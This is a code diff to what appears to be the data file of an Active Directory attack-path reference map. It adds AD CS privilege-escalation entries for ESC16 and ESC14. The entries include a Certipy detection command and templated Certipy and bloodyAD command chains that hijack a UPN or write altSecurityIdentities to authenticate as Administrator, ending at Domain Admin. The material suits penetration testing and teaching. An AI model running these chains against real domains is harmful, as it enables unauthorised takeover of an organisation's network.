@@ -1456,7 +1456,7 @@ var AD_MAP_V2 = {
       id: "adcs",
       title: "AD CS (Certificate Services)",
       color: "#c026d3",
-      tag: "ESC1–ESC15",
+      tag: "ESC1–ESC16",
       desc: "Active Directory Certificate Services misconfigurations (the ESC series). A vulnerable template, CA, or ACL lets you enrol a certificate as a privileged user and authenticate as them — often straight to Domain Admin.",
       techniques: [
         {
@@ -1602,6 +1602,28 @@ var AD_MAP_V2 = {
           moveTo: []
         },
         {
+          id: "adcs-esc16",
+          title: "Security Extension disabled CA-wide (ESC16)",
+          theory: { label: "AD CS", url: "theory/2026-08-18-adcs.html" },
+          vuln: { label: "AD CS Template Abuse", url: "vuln-detail.html?vuln=adcs-esc" },
+          cve: null,
+          desc: "The CA carries the SID security extension OID (1.3.6.1.4.1.311.25.2) in its DisableExtensionList, so it strips that extension from every certificate it issues — making every client-auth template behave like ESC9 across the whole domain. Certipy flags it under 'Disabled Extensions'.",
+          cmds: [],
+          branches: [
+            { label: "Detect — Certipy shows the disabled extension", cmds: [
+              "certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable -stdout"
+            ], note: "Look for ESC16 / a 'Disabled Extensions' line listing 1.3.6.1.4.1.311.25.2. A CA missing the May-2022 patch (KB5014754) looks identical — it cannot embed the SID extension either.", outcomes: [{ label: "Vulnerable CA", color: "#c084fc" }] },
+            { label: "Exploit — UPN hijack like ESC9", cmds: [
+              "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn administrator@<domain>",
+              "certipy req -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template User",
+              "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn <accountB>@<domain>",
+              "certipy auth -pfx administrator.pfx -dc-ip <dc_ip>"
+            ], note: "With no SID in the cert, the DC maps by UPN: point accountB's UPN at a target, enrol on any client-auth template, reset the UPN, then authenticate.", outcomes: [{ label: "Pass the certificate", color: "#9ca3af" }, { label: "Domain Admin", color: "#ef4444" }] }
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
           id: "adcs-mapping",
           title: "Abuse certificate mapping (ESC9/ESC10/ESC14)",
           theory: { label: "AD CS", url: "theory/2026-08-18-adcs.html" },
@@ -1625,7 +1647,12 @@ var AD_MAP_V2 = {
             ] },
             { label: "Reset accountB's UPN afterwards", cmds: [
               "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn <accountB>@<domain>"
-            ], note: "Kerberos mapping = ESC9/ESC10 case 1; Schannel mapping = ESC9/ESC10 case 2.", outcomes: [{ label: "Pass the certificate", color: "#9ca3af" }] }
+            ], note: "Kerberos mapping = ESC9/ESC10 case 1; Schannel mapping = ESC9/ESC10 case 2.", outcomes: [{ label: "Pass the certificate", color: "#9ca3af" }] },
+            { label: "ESC14 — write altSecurityIdentities (explicit mapping)", cmds: [
+              "bloodyAD -u <owned> -p <pass> -d <domain> --host <dc_ip> set object <victim> altSecurityIdentities -v 'X509:<I>...<S>...'",
+              "certipy req -username <owned>@<domain> -password <pass> -ca <ca_name> -template User",
+              "certipy auth -pfx <owned>.pfx -username <victim> -domain <domain> -dc-ip <dc_ip>"
+            ], note: "Write access to a victim's altSecurityIdentities adds an explicit cert mapping you control; an explicit mapping only needs the cert to chain to a trusted root on the DC, not NTAuth (SpecterOps, 2024). Also writable via PowerView Set-DomainObject or the BloodHound WriteAltSecurityIdentities edge.", outcomes: [{ label: "Pass the certificate", color: "#9ca3af" }] }
           ],
           outcomes: [],
           moveTo: []
